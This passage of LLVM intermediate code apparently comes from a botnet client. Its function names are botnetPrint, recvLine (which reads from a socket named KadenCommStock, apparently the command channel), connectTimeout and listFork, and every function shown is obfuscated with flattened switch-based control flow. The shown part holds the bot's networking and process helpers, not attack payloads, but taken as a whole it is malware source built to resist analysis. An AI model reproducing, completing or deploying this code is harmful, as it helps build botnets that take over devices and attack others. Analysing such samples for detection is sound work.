; <label>:302:                                    ; preds = %loopEntry
  %303 = load i8**, i8*** %4, align 8
  %304 = load i8*, i8** %303, align 8
  store i8 0, i8* %304, align 1
  store i32 667651385, i32* %switchVar
  br label %loopEnd

; <label>:305:                                    ; preds = %loopEntry
  %306 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %307 = bitcast %struct.__va_list_tag* %306 to i8*
  call void @llvm.va_end(i8* %307)
  %308 = load i32, i32* %9, align 4
  ret i32 %308

loopEnd:                                          ; preds = %302, %298, %295, %294, %287, %286, %285, %273, %268, %262, %256, %250, %243, %238, %232, %225, %219, %212, %207, %201, %194, %188, %181, %176, %170, %163, %157, %150, %145, %139, %132, %126, %120, %119, %117, %110, %105, %99, %93, %87, %84, %75, %73, %68, %62, %61, %56, %50, %49, %46, %40, %39, %33, %32, %24, %18, %12, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @botnetPrint(i32, i8*, ...) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca [1 x %struct.__va_list_tag], align 16
  %8 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  store i8* %1, i8** %4, align 8
  %9 = call noalias i8* @malloc(i64 2048) #3
  store i8* %9, i8** %5, align 8
  %10 = load i8*, i8** %5, align 8
  call void @llvm.memset.p0i8.i64(i8* %10, i8 0, i64 2048, i32 1, i1 false)
  %11 = load i8*, i8** %5, align 8
  store i8* %11, i8** %6, align 8
  %12 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %13 = bitcast %struct.__va_list_tag* %12 to i8*
  call void @llvm.va_start(i8* %13)
  %14 = load i8*, i8** %4, align 8
  %15 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %16 = call i32 @print(i8** %5, i8* %14, %struct.__va_list_tag* %15)
  %17 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %18 = bitcast %struct.__va_list_tag* %17 to i8*
  call void @llvm.va_end(i8* %18)
  %19 = load i8*, i8** %6, align 8
  %20 = load i8*, i8** %6, align 8
  %21 = call i64 @strlen(i8* %20) #9
  %22 = getelementptr inbounds i8, i8* %19, i64 %21
  store i8 10, i8* %22, align 1
  %23 = load i32, i32* %3, align 4
  %24 = load i8*, i8** %6, align 8
  %25 = load i8*, i8** %6, align 8
  %26 = call i64 @strlen(i8* %25) #9
  %27 = call i64 @send(i32 %23, i8* %24, i64 %26, i32 16384)
  %28 = trunc i64 %27 to i32
  store i32 %28, i32* %8, align 4
  %29 = load i8*, i8** %6, align 8
  call void @free(i8* %29) #3
  %30 = load i32, i32* %8, align 4
  ret i32 %30
}

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) #1

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #4

; Function Attrs: nounwind
declare void @llvm.va_end(i8*) #3

; Function Attrs: nounwind readonly
declare i64 @strlen(i8*) #5

declare i64 @send(i32, i8*, i64, i32) #2

; Function Attrs: nounwind
declare void @free(i8*) #1

; Function Attrs: noinline nounwind uwtable
define void @trim(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %4, align 4
  %6 = load i8*, i8** %2, align 8
  %7 = call i64 @strlen(i8* %6) #9
  %8 = sub i64 %7, 1
  %9 = trunc i64 %8 to i32
  store i32 %9, i32* %5, align 4
  %switchVar = alloca i32
  store i32 730215011, i32* %switchVar
  %.reg2mem = alloca i1
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 730215011, label %10
    i32 681321279, label %26
    i32 -142998183, label %29
    i32 621590062, label %30
    i32 1464741335, label %35
    i32 1591405117, label %50
    i32 220507610, label %52
    i32 -1114661239, label %55
    i32 -422738607, label %57
    i32 -1240402392, label %62
    i32 -733508216, label %74
    i32 -692095204, label %77
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:10:                                     ; preds = %loopEntry
  %11 = call i16** @__ctype_b_loc() #10
  %12 = load i16*, i16** %11, align 8
  %13 = load i8*, i8** %2, align 8
  %14 = load i32, i32* %4, align 4
  %15 = sext i32 %14 to i64
  %16 = getelementptr inbounds i8, i8* %13, i64 %15
  %17 = load i8, i8* %16, align 1
  %18 = sext i8 %17 to i32
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds i16, i16* %12, i64 %19
  %21 = load i16, i16* %20, align 2
  %22 = zext i16 %21 to i32
  %23 = and i32 %22, 8192
  %24 = icmp ne i32 %23, 0
  %25 = select i1 %24, i32 681321279, i32 -142998183
  store i32 %25, i32* %switchVar
  br label %loopEnd

; <label>:26:                                     ; preds = %loopEntry
  %27 = load i32, i32* %4, align 4
  %28 = add nsw i32 %27, 1
  store i32 %28, i32* %4, align 4
  store i32 730215011, i32* %switchVar
  br label %loopEnd

; <label>:29:                                     ; preds = %loopEntry
  store i32 621590062, i32* %switchVar
  br label %loopEnd

; <label>:30:                                     ; preds = %loopEntry
  %31 = load i32, i32* %5, align 4
  %32 = load i32, i32* %4, align 4
  %33 = icmp sge i32 %31, %32
  %34 = select i1 %33, i32 1464741335, i32 1591405117
  store i32 %34, i32* %switchVar
  store i1 false, i1* %.reg2mem
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  %36 = call i16** @__ctype_b_loc() #10
  %37 = load i16*, i16** %36, align 8
  %38 = load i8*, i8** %2, align 8
  %39 = load i32, i32* %5, align 4
  %40 = sext i32 %39 to i64
  %41 = getelementptr inbounds i8, i8* %38, i64 %40
  %42 = load i8, i8* %41, align 1
  %43 = sext i8 %42 to i32
  %44 = sext i32 %43 to i64
  %45 = getelementptr inbounds i16, i16* %37, i64 %44
  %46 = load i16, i16* %45, align 2
  %47 = zext i16 %46 to i32
  %48 = and i32 %47, 8192
  %49 = icmp ne i32 %48, 0
  store i32 1591405117, i32* %switchVar
  store i1 %49, i1* %.reg2mem
  br label %loopEnd

; <label>:50:                                     ; preds = %loopEntry
  %.reload = load i1, i1* %.reg2mem
  %51 = select i1 %.reload, i32 220507610, i32 -1114661239
  store i32 %51, i32* %switchVar
  br label %loopEnd

; <label>:52:                                     ; preds = %loopEntry
  %53 = load i32, i32* %5, align 4
  %54 = add nsw i32 %53, -1
  store i32 %54, i32* %5, align 4
  store i32 621590062, i32* %switchVar
  br label %loopEnd

; <label>:55:                                     ; preds = %loopEntry
  %56 = load i32, i32* %4, align 4
  store i32 %56, i32* %3, align 4
  store i32 -422738607, i32* %switchVar
  br label %loopEnd

; <label>:57:                                     ; preds = %loopEntry
  %58 = load i32, i32* %3, align 4
  %59 = load i32, i32* %5, align 4
  %60 = icmp sle i32 %58, %59
  %61 = select i1 %60, i32 -1240402392, i32 -692095204
  store i32 %61, i32* %switchVar
  br label %loopEnd

; <label>:62:                                     ; preds = %loopEntry
  %63 = load i8*, i8** %2, align 8
  %64 = load i32, i32* %3, align 4
  %65 = sext i32 %64 to i64
  %66 = getelementptr inbounds i8, i8* %63, i64 %65
  %67 = load i8, i8* %66, align 1
  %68 = load i8*, i8** %2, align 8
  %69 = load i32, i32* %3, align 4
  %70 = load i32, i32* %4, align 4
  %71 = sub nsw i32 %69, %70
  %72 = sext i32 %71 to i64
  %73 = getelementptr inbounds i8, i8* %68, i64 %72
  store i8 %67, i8* %73, align 1
  store i32 -733508216, i32* %switchVar
  br label %loopEnd

; <label>:74:                                     ; preds = %loopEntry
  %75 = load i32, i32* %3, align 4
  %76 = add nsw i32 %75, 1
  store i32 %76, i32* %3, align 4
  store i32 -422738607, i32* %switchVar
  br label %loopEnd

; <label>:77:                                     ; preds = %loopEntry
  %78 = load i8*, i8** %2, align 8
  %79 = load i32, i32* %3, align 4
  %80 = load i32, i32* %4, align 4
  %81 = sub nsw i32 %79, %80
  %82 = sext i32 %81 to i64
  %83 = getelementptr inbounds i8, i8* %78, i64 %82
  store i8 0, i8* %83, align 1
  ret void

loopEnd:                                          ; preds = %74, %62, %57, %55, %52, %50, %35, %30, %29, %26, %10, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind readnone
declare i16** @__ctype_b_loc() #6

; Function Attrs: noinline nounwind uwtable
define i32 @getHost(i8*, %struct.in_addr*) #0 {
  %.reg2mem = alloca i32
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca %struct.in_addr*, align 8
  %6 = alloca %struct.hostent*, align 8
  store i8* %0, i8** %4, align 8
  store %struct.in_addr* %1, %struct.in_addr** %5, align 8
  %7 = load i8*, i8** %4, align 8
  %8 = call i32 @inet_addr(i8* %7) #3
  store i32 %8, i32* %.reg2mem
  %9 = load %struct.in_addr*, %struct.in_addr** %5, align 8
  %10 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %9, i32 0, i32 0
  %.reload2 = load volatile i32, i32* %.reg2mem
  store i32 %.reload2, i32* %10, align 4
  %switchVar = alloca i32
  store i32 -555857451, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -555857451, label %first
    i32 1839924871, label %13
    i32 1316562849, label %14
    i32 549702643, label %15
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %11 = icmp eq i32 %.reload, -1
  %12 = select i1 %11, i32 1839924871, i32 1316562849
  store i32 %12, i32* %switchVar
  br label %loopEnd

; <label>:13:                                     ; preds = %loopEntry
  store i32 1, i32* %3, align 4
  store i32 549702643, i32* %switchVar
  br label %loopEnd

; <label>:14:                                     ; preds = %loopEntry
  store i32 0, i32* %3, align 4
  store i32 549702643, i32* %switchVar
  br label %loopEnd

; <label>:15:                                     ; preds = %loopEntry
  %16 = load i32, i32* %3, align 4
  ret i32 %16

loopEnd:                                          ; preds = %14, %13, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) #1

; Function Attrs: noinline nounwind uwtable
define i32 @recvLine(i32, i8*, i32) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca %struct.fd_set, align 8
  %9 = alloca %struct.timeval, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8, align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  %19 = load i8*, i8** %6, align 8
  %20 = load i32, i32* %7, align 4
  %21 = sext i32 %20 to i64
  call void @llvm.memset.p0i8.i64(i8* %19, i8 0, i64 %21, i32 1, i1 false)
  %22 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %22, align 8
  %23 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %23, align 8
  %switchVar = alloca i32
  store i32 1314940798, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %3
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1314940798, label %24
    i32 -2011676817, label %33
    i32 59718091, label %50
    i32 -1569403657, label %51
    i32 1602566195, label %55
    i32 -700764249, label %58
    i32 1532425542, label %67
    i32 -668807389, label %84
    i32 1733029450, label %87
    i32 -682946749, label %88
    i32 -716243619, label %89
    i32 -903862390, label %91
    i32 -613703627, label %96
    i32 1722891270, label %101
    i32 1722202212, label %103
    i32 240764622, label %111
    i32 -779158587, label %112
    i32 1740055723, label %115
    i32 1648618778, label %118
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  %25 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i32 0, i32 0
  %26 = getelementptr inbounds [16 x i64], [16 x i64]* %25, i64 0, i64 0
  %27 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %26) #3, !srcloc !1
  %28 = extractvalue { i64, i64* } %27, 0
  %29 = extractvalue { i64, i64* } %27, 1
  %30 = trunc i64 %28 to i32
  store i32 %30, i32* %10, align 4
  %31 = ptrtoint i64* %29 to i64
  %32 = trunc i64 %31 to i32
  store i32 %32, i32* %11, align 4
  store i32 -2011676817, i32* %switchVar
  br label %loopEnd

; <label>:33:                                     ; preds = %loopEntry
  %34 = load i32, i32* %5, align 4
  %35 = srem i32 %34, 64
  %36 = zext i32 %35 to i64
  %37 = shl i64 1, %36
  %38 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i32 0, i32 0
  %39 = load i32, i32* %5, align 4
  %40 = sdiv i32 %39, 64
  %41 = sext i32 %40 to i64
  %42 = getelementptr inbounds [16 x i64], [16 x i64]* %38, i64 0, i64 %41
  %43 = load i64, i64* %42, align 8
  %44 = or i64 %43, %37
  store i64 %44, i64* %42, align 8
  %45 = load i32, i32* %5, align 4
  %46 = add nsw i32 %45, 1
  %47 = call i32 @select(i32 %46, %struct.fd_set* %8, %struct.fd_set* null, %struct.fd_set* %8, %struct.timeval* %9)
  store i32 %47, i32* %12, align 4
  %48 = icmp sle i32 %47, 0
  %49 = select i1 %48, i32 59718091, i32 -716243619
  store i32 %49, i32* %switchVar
  br label %loopEnd

; <label>:50:                                     ; preds = %loopEntry
  store i32 -1569403657, i32* %switchVar
  br label %loopEnd

; <label>:51:                                     ; preds = %loopEntry
  %52 = load i32, i32* %13, align 4
  %53 = icmp slt i32 %52, 10
  %54 = select i1 %53, i32 1602566195, i32 -682946749
  store i32 %54, i32* %switchVar
  br label %loopEnd

; <label>:55:                                     ; preds = %loopEntry
  %56 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %56, align 8
  %57 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %57, align 8
  store i32 -700764249, i32* %switchVar
  br label %loopEnd

; <label>:58:                                     ; preds = %loopEntry
  %59 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i32 0, i32 0
  %60 = getelementptr inbounds [16 x i64], [16 x i64]* %59, i64 0, i64 0
  %61 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %60) #3, !srcloc !2
  %62 = extractvalue { i64, i64* } %61, 0
  %63 = extractvalue { i64, i64* } %61, 1
  %64 = trunc i64 %62 to i32
  store i32 %64, i32* %14, align 4
  %65 = ptrtoint i64* %63 to i64
  %66 = trunc i64 %65 to i32
  store i32 %66, i32* %15, align 4
  store i32 1532425542, i32* %switchVar
  br label %loopEnd

; <label>:67:                                     ; preds = %loopEntry
  %68 = load i32, i32* %5, align 4
  %69 = srem i32 %68, 64
  %70 = zext i32 %69 to i64
  %71 = shl i64 1, %70
  %72 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i32 0, i32 0
  %73 = load i32, i32* %5, align 4
  %74 = sdiv i32 %73, 64
  %75 = sext i32 %74 to i64
  %76 = getelementptr inbounds [16 x i64], [16 x i64]* %72, i64 0, i64 %75
  %77 = load i64, i64* %76, align 8
  %78 = or i64 %77, %71
  store i64 %78, i64* %76, align 8
  %79 = load i32, i32* %5, align 4
  %80 = add nsw i32 %79, 1
  %81 = call i32 @select(i32 %80, %struct.fd_set* %8, %struct.fd_set* null, %struct.fd_set* %8, %struct.timeval* %9)
  store i32 %81, i32* %12, align 4
  %82 = icmp sle i32 %81, 0
  %83 = select i1 %82, i32 -668807389, i32 1733029450
  store i32 %83, i32* %switchVar
  br label %loopEnd

; <label>:84:                                     ; preds = %loopEntry
  %85 = load i32, i32* %13, align 4
  %86 = add nsw i32 %85, 1
  store i32 %86, i32* %13, align 4
  store i32 -1569403657, i32* %switchVar
  br label %loopEnd

; <label>:87:                                     ; preds = %loopEntry
  store i32 -682946749, i32* %switchVar
  br label %loopEnd

; <label>:88:                                     ; preds = %loopEntry
  store i32 -716243619, i32* %switchVar
  br label %loopEnd

; <label>:89:                                     ; preds = %loopEntry
  store i32 0, i32* %18, align 4
  %90 = load i8*, i8** %6, align 8
  store i8* %90, i8** %17, align 8
  store i32 -903862390, i32* %switchVar
  br label %loopEnd

; <label>:91:                                     ; preds = %loopEntry
  %92 = load i32, i32* %7, align 4
  %93 = add nsw i32 %92, -1
  store i32 %93, i32* %7, align 4
  %94 = icmp sgt i32 %92, 1
  %95 = select i1 %94, i32 -613703627, i32 1740055723
  store i32 %95, i32* %switchVar
  br label %loopEnd

; <label>:96:                                     ; preds = %loopEntry
  %97 = load i32, i32* @KadenCommStock, align 4
  %98 = call i64 @recv(i32 %97, i8* %16, i64 1, i32 0)
  %99 = icmp ne i64 %98, 1
  %100 = select i1 %99, i32 1722891270, i32 1722202212
  store i32 %100, i32* %switchVar
  br label %loopEnd

; <label>:101:                                    ; preds = %loopEntry
  %102 = load i8*, i8** %17, align 8
  store i8 0, i8* %102, align 1
  store i32 -1, i32* %4, align 4
  store i32 1648618778, i32* %switchVar
  br label %loopEnd

; <label>:103:                                    ; preds = %loopEntry
  %104 = load i8, i8* %16, align 1
  %105 = load i8*, i8** %17, align 8
  %106 = getelementptr inbounds i8, i8* %105, i32 1
  store i8* %106, i8** %17, align 8
  store i8 %104, i8* %105, align 1
  %107 = load i8, i8* %16, align 1
  %108 = zext i8 %107 to i32
  %109 = icmp eq i32 %108, 10
  %110 = select i1 %109, i32 240764622, i32 -779158587
  store i32 %110, i32* %switchVar
  br label %loopEnd

; <label>:111:                                    ; preds = %loopEntry
  store i32 1740055723, i32* %switchVar
  br label %loopEnd

; <label>:112:                                    ; preds = %loopEntry
  %113 = load i32, i32* %18, align 4
  %114 = add nsw i32 %113, 1
  store i32 %114, i32* %18, align 4
  store i32 -903862390, i32* %switchVar
  br label %loopEnd

; <label>:115:                                    ; preds = %loopEntry
  %116 = load i8*, i8** %17, align 8
  store i8 0, i8* %116, align 1
  %117 = load i32, i32* %18, align 4
  store i32 %117, i32* %4, align 4
  store i32 1648618778, i32* %switchVar
  br label %loopEnd

; <label>:118:                                    ; preds = %loopEntry
  %119 = load i32, i32* %4, align 4
  ret i32 %119

loopEnd:                                          ; preds = %115, %112, %111, %103, %101, %96, %91, %89, %88, %87, %84, %67, %58, %55, %51, %50, %33, %24, %switchDefault
  br label %loopEntry
}

declare i32 @select(i32, %struct.fd_set*, %struct.fd_set*, %struct.fd_set*, %struct.timeval*) #2

declare i64 @recv(i32, i8*, i64, i32) #2

; Function Attrs: noinline nounwind uwtable
define i32 @connectTimeout(i32, i8*, i32, i32) #0 {
  %.reg2mem = alloca i32
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca %struct.sockaddr_in, align 4
  %11 = alloca %struct.fd_set, align 8
  %12 = alloca %struct.timeval, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i64, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  store i32 %0, i32* %6, align 4
  store i8* %1, i8** %7, align 8
  store i32 %2, i32* %8, align 4
  store i32 %3, i32* %9, align 4
  %19 = load i32, i32* %6, align 4
  %20 = call i32 (i32, i32, ...) @fcntl(i32 %19, i32 3, i8* null)
  %21 = sext i32 %20 to i64
  store i64 %21, i64* %15, align 8
  %22 = load i64, i64* %15, align 8
  %23 = or i64 %22, 2048
  store i64 %23, i64* %15, align 8
  %24 = load i32, i32* %6, align 4
  %25 = load i64, i64* %15, align 8
  %26 = call i32 (i32, i32, ...) @fcntl(i32 %24, i32 4, i64 %25)
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 0
  store i16 2, i16* %27, align 4
  %28 = load i32, i32* %8, align 4
  %29 = trunc i32 %28 to i16
  %30 = call zeroext i16 @htons(i16 zeroext %29) #10
  %31 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 1
  store i16 %30, i16* %31, align 2
  %32 = load i8*, i8** %7, align 8
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 2
  %34 = call i32 @getHost(i8* %32, %struct.in_addr* %33)
  store i32 %34, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 900529973, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 900529973, label %first
    i32 1640255464, label %37
    i32 1383649450, label %38
    i32 -1072440219, label %47
    i32 -252097167, label %52
    i32 -2056736575, label %57
    i32 186589768, label %66
    i32 -1398704315, label %83
    i32 713679101, label %90
    i32 -270509837, label %91
    i32 188691563, label %92
    i32 2133586600, label %93
    i32 -564646187, label %94
    i32 1706065858, label %95
    i32 -831472904, label %96
    i32 -1590264074, label %105
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %35 = icmp ne i32 %.reload, 0
  %36 = select i1 %35, i32 1640255464, i32 1383649450
  store i32 %36, i32* %switchVar
  br label %loopEnd

; <label>:37:                                     ; preds = %loopEntry
  store i32 0, i32* %5, align 4
  store i32 -1590264074, i32* %switchVar
  br label %loopEnd

; <label>:38:                                     ; preds = %loopEntry
  %39 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 3
  %40 = getelementptr inbounds [8 x i8], [8 x i8]* %39, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %40, i8 0, i64 8, i32 4, i1 false)
  %41 = load i32, i32* %6, align 4
  %42 = bitcast %struct.sockaddr_in* %10 to %struct.sockaddr*
  %43 = call i32 @connect(i32 %41, %struct.sockaddr* %42, i32 16)
  store i32 %43, i32* %16, align 4
  %44 = load i32, i32* %16, align 4
  %45 = icmp slt i32 %44, 0
  %46 = select i1 %45, i32 -1072440219, i32 -831472904
  store i32 %46, i32* %switchVar
  br label %loopEnd

; <label>:47:                                     ; preds = %loopEntry
  %48 = call i32* @__errno_location() #10
  %49 = load i32, i32* %48, align 4
  %50 = icmp eq i32 %49, 115
  %51 = select i1 %50, i32 -252097167, i32 -564646187
  store i32 %51, i32* %switchVar
  br label %loopEnd

; <label>:52:                                     ; preds = %loopEntry
  %53 = load i32, i32* %9, align 4
  %54 = sext i32 %53 to i64
  %55 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 %54, i64* %55, align 8
  %56 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 0, i64* %56, align 8
  store i32 -2056736575, i32* %switchVar
  br label %loopEnd

; <label>:57:                                     ; preds = %loopEntry
  %58 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %11, i32 0, i32 0
  %59 = getelementptr inbounds [16 x i64], [16 x i64]* %58, i64 0, i64 0
  %60 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %59) #3, !srcloc !3
  %61 = extractvalue { i64, i64* } %60, 0
  %62 = extractvalue { i64, i64* } %60, 1
  %63 = trunc i64 %61 to i32
  store i32 %63, i32* %17, align 4
  %64 = ptrtoint i64* %62 to i64
  %65 = trunc i64 %64 to i32
  store i32 %65, i32* %18, align 4
  store i32 186589768, i32* %switchVar
  br label %loopEnd

; <label>:66:                                     ; preds = %loopEntry
  %67 = load i32, i32* %6, align 4
  %68 = srem i32 %67, 64
  %69 = zext i32 %68 to i64
  %70 = shl i64 1, %69
  %71 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %11, i32 0, i32 0
  %72 = load i32, i32* %6, align 4
  %73 = sdiv i32 %72, 64
  %74 = sext i32 %73 to i64
  %75 = getelementptr inbounds [16 x i64], [16 x i64]* %71, i64 0, i64 %74
  %76 = load i64, i64* %75, align 8
  %77 = or i64 %76, %70
  store i64 %77, i64* %75, align 8
  %78 = load i32, i32* %6, align 4
  %79 = add nsw i32 %78, 1
  %80 = call i32 @select(i32 %79, %struct.fd_set* null, %struct.fd_set* %11, %struct.fd_set* null, %struct.timeval* %12)
  %81 = icmp sgt i32 %80, 0
  %82 = select i1 %81, i32 -1398704315, i32 188691563
  store i32 %82, i32* %switchVar
  br label %loopEnd

; <label>:83:                                     ; preds = %loopEntry
  store i32 4, i32* %13, align 4
  %84 = load i32, i32* %6, align 4
  %85 = bitcast i32* %14 to i8*
  %86 = call i32 @getsockopt(i32 %84, i32 1, i32 4, i8* %85, i32* %13) #3
  %87 = load i32, i32* %14, align 4
  %88 = icmp ne i32 %87, 0
  %89 = select i1 %88, i32 713679101, i32 -270509837
  store i32 %89, i32* %switchVar
  br label %loopEnd

; <label>:90:                                     ; preds = %loopEntry
  store i32 0, i32* %5, align 4
  store i32 -1590264074, i32* %switchVar
  br label %loopEnd

; <label>:91:                                     ; preds = %loopEntry
  store i32 2133586600, i32* %switchVar
  br label %loopEnd

; <label>:92:                                     ; preds = %loopEntry
  store i32 0, i32* %5, align 4
  store i32 -1590264074, i32* %switchVar
  br label %loopEnd

; <label>:93:                                     ; preds = %loopEntry
  store i32 1706065858, i32* %switchVar
  br label %loopEnd

; <label>:94:                                     ; preds = %loopEntry
  store i32 0, i32* %5, align 4
  store i32 -1590264074, i32* %switchVar
  br label %loopEnd

; <label>:95:                                     ; preds = %loopEntry
  store i32 -831472904, i32* %switchVar
  br label %loopEnd

; <label>:96:                                     ; preds = %loopEntry
  %97 = load i32, i32* %6, align 4
  %98 = call i32 (i32, i32, ...) @fcntl(i32 %97, i32 3, i8* null)
  %99 = sext i32 %98 to i64
  store i64 %99, i64* %15, align 8
  %100 = load i64, i64* %15, align 8
  %101 = and i64 %100, -2049
  store i64 %101, i64* %15, align 8
  %102 = load i32, i32* %6, align 4
  %103 = load i64, i64* %15, align 8
  %104 = call i32 (i32, i32, ...) @fcntl(i32 %102, i32 4, i64 %103)
  store i32 1, i32* %5, align 4
  store i32 -1590264074, i32* %switchVar
  br label %loopEnd

; <label>:105:                                    ; preds = %loopEntry
  %106 = load i32, i32* %5, align 4
  ret i32 %106

loopEnd:                                          ; preds = %96, %95, %94, %93, %92, %91, %90, %83, %66, %57, %52, %47, %38, %37, %first, %switchDefault
  br label %loopEntry
}

declare i32 @fcntl(i32, i32, ...) #2

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) #6

declare i32 @connect(i32, %struct.sockaddr*, i32) #2

; Function Attrs: nounwind readnone
declare i32* @__errno_location() #6

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) #1

; Function Attrs: noinline nounwind uwtable
define i32 @listFork() #0 {
  %.reg2mem = alloca i32
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32*, align 8
  %4 = alloca i32, align 4
  %5 = call i32 @fork() #3
  store i32 %5, i32* %2, align 4
  %6 = load i32, i32* %2, align 4
  store i32 %6, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 595467691, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 595467691, label %first
    i32 -72554220, label %9
    i32 -1225541854, label %11
    i32 1923019553, label %19
    i32 1281022153, label %26
    i32 1809326181, label %36
    i32 221183217, label %39
    i32 455055999, label %49
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %7 = icmp ule i32 %.reload, 0
  %8 = select i1 %7, i32 -72554220, i32 -1225541854
  store i32 %8, i32* %switchVar
  br label %loopEnd

; <label>:9:                                      ; preds = %loopEntry
  %10 = load i32, i32* %2, align 4
  store i32 %10, i32* %1, align 4
  store i32 455055999, i32* %switchVar
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  %12 = load i64, i64* @numpids, align 8
  %13 = add i64 %12, 1
  store i64 %13, i64* @numpids, align 8
  %14 = load i64, i64* @numpids, align 8
  %15 = add i64 %14, 1
  %16 = mul i64 %15, 4
  %17 = call noalias i8* @malloc(i64 %16) #3
  %18 = bitcast i8* %17 to i32*
  store i32* %18, i32** %3, align 8
  store i32 0, i32* %4, align 4
  store i32 1923019553, i32* %switchVar
  br label %loopEnd

; <label>:19:                                     ; preds = %loopEntry
  %20 = load i32, i32* %4, align 4
  %21 = zext i32 %20 to i64
  %22 = load i64, i64* @numpids, align 8
  %23 = sub i64 %22, 1
  %24 = icmp ult i64 %21, %23
  %25 = select i1 %24, i32 1281022153, i32 221183217
  store i32 %25, i32* %switchVar
  br label %loopEnd

; <label>:26:                                     ; preds = %loopEntry
  %27 = load i32*, i32** @pids, align 8
